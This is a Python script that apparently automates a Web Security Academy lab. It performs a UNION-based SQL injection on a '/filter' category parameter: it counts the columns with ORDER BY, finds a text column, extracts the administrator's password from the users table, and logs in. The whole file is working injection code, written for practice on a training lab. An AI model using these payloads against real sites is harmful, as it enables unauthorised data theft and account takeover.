from web_security_academy.core.utils import *
from bs4 import BeautifulSoup


def solve_lab(session):
    path = "/filter"

    print_info("Determining the number of columns...")

    num_columns = 0
    i = 1
    while True:
        params = {"category": f"' ORDER BY {i} -- //"}
        resp = session.get_path(path, params=params)
        print_info_secondary(f"{params} => {resp.status_code}")
        if resp.status_code == 500:
            break
        else:
            num_columns += 1
            i += 1

    print_success(f"There are {num_columns} columns.\n")
    print_info("Finding a column with the string data type...")

    i = 0
    while i < num_columns:
        columns = ["null"] * num_columns
        columns[i] = "'aaa'"
        columns = ", ".join(columns)

        params = {"category": f"' UNION SELECT {columns} -- //"}
        resp = session.get_path(path, params=params)
        print_info_secondary(f"{params} => {resp.status_code}")
        if resp.status_code == 200:
            break
        else:
            i += 1

    if i == num_columns:
        print_fail("Unable to find a column with the string data type")
    else:
        print_success(f"Column {i} has the string data type.\n")

    columns = ["null"] * num_columns
    columns[i] = "password"
    columns = ", ".join(columns)
    params = {
        "category": f"' UNION SELECT {columns} FROM users WHERE username = 'administrator' --"
    }

    print_info(
        f'Extracting administrator password by visiting "{path}" with the following parameters:'
    )
    print(params)

    resp = session.get_path(path, params=params)
    soup = BeautifulSoup(resp.text, "lxml")
    query = soup.find(lambda tag: tag.name == "th")

    if query is None:
        print_fail("Unable to extract administrator password.")

    password = query.text
    print_success(f"Found administrator password: {password}\n")

    session.login("administrator", password)
